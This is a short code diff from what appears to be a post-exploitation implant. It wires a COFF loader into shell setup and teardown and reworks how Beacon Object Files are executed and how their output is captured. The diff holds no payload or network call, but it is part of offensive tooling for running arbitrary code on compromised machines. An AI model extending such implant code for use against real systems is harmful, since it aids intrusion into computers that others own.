@@ -21,6 +21,8 @@ static int   beacon_buf_cap = 0;
 static char  cwd[MAX_PATH]  = {0};
 
 int shell_init(void) {
+    if (CoffLoaderInit() != COFF_SUCCESS) return -1;  // add this
+
     beacon_buf = calloc(OUTPUT_BUF_SIZE, 1);
     if (!beacon_buf) return -1;
     beacon_buf_cap = OUTPUT_BUF_SIZE;
@@ -33,6 +35,7 @@ void shell_cleanup(void) {
     beacon_buf     = NULL;
     beacon_buf_pos = 0;
     beacon_buf_cap = 0;
+    CoffLoaderTeardown();  // add this
 }
 
 int shell_output_len(void) {
@@ -77,22 +80,23 @@ void beacon_log(const char *fmt, ...) {
 // BOF execution
 // ---------------------------------------------------------------------------
 int execute_bof(unsigned char *bof_data, size_t bof_size, char *args, int args_len) {
-    char *coff_args = malloc(args_len + 4);
-    if (!coff_args) return 1;
-    *(DWORD *)coff_args = (DWORD)args_len;
-    if (args_len > 0)
-        memcpy(coff_args + 4, args, args_len);
+    coff_error_t result = CoffRunBOF(
+        "go",
+        (const uint8_t *)bof_data,
+        (uint32_t)bof_size,
+        NULL,                          // use default allocator
+        (uint8_t *)args,
+        args_len
+    );
 
-    int   result     = RunCOFF("go", bof_data, bof_size,
-                                (unsigned char *)coff_args, args_len + 4);
-    int   out_size   = 0;
+    int out_size = 0;
     char *bof_output = BeaconGetOutputData(&out_size);
     if (bof_output && out_size > 0) {
         buf_append(bof_output, out_size);
         free(bof_output);
     }
-    free(coff_args);
-    return result;
+
+    return (result == COFF_SUCCESS) ? 0 : 1;
 }
 
 // ---------------------------------------------------------------------------
